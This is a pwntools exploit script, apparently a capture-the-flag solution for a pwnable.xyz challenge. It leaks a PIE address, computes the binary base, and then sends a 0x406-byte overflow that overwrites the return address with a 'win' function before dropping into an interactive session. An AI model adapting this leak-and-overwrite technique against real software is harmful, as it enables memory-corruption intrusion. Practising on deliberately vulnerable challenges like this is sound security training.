#!/usr/bin/env python2
'''
    author : tripoloski 
    visit  : https://tripoloski1337.github.io/
    mail   : arsalan.dp@gmail.com
'''
import sys
from pwn import *
context.update(arch="amd64", endian="little", os="linux", log_level="info",
               terminal=["tmux", "split-window", "-v", "-p 85"],)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("./challenge")
elf = ELF(TARGET)

def attach(r):
    if LOCAL:
        bkps = []
        gdb.attach(r, '\n'.join(["pie break %s"%(x,) for x in bkps]))
    return

def init(dat):
    r.sendlineafter(">","1")
    r.sendlineafter("data:", dat)

def get_size():
    r.sendlineafter("> ","2")
    r.recvuntil("me")
    data = r.recv(3).split()
    log.info("size write: " + str(data)[0])
    log.info("raw: " + str(data))
    return int(data[0])

def append(data):
    r.sendlineafter(":",data)
    log.info("sent!")

def appendix(d):
    r.writeafter(":",d)
    log.info("sent p2!")

def exploit(r):
    attach(r)
    init("B" * 8)
    while True:
        size = get_size() 
        if size == 0:
            continue
        if size == 14:
            append("AAAAAAAA")
            break
        else:
            append("A")
    r.sendlineafter(">","3")
    r.recvuntil("AAAAAAAA\n")
    raw = r.recvline().split()[0].ljust(8, "\x00")
    print "raw: " + str(raw)
    leak = u64(str(raw))
    log.info("leakage: " + hex(leak))
    base_pie = int(hex(leak)[:-1] + "000", 16)
    log.info("base pie: " + hex(base_pie))
    win = base_pie + 0xB57
    log.info("win@ : " + hex(win))

    init("#")
    p = "A" * (0x406)
    p += p64(win)
    begin = 0

    while True:
        n = get_size()
        end = min(begin+n, 1038)
        
        log.info("written: " + str(end))
        if n == 0:
            continue 

        appendix(p[begin:end])
        begin = end
        
        if end == 1038:
            break
    


    r.interactive()

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("svc.pwnable.xyz", 30014)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)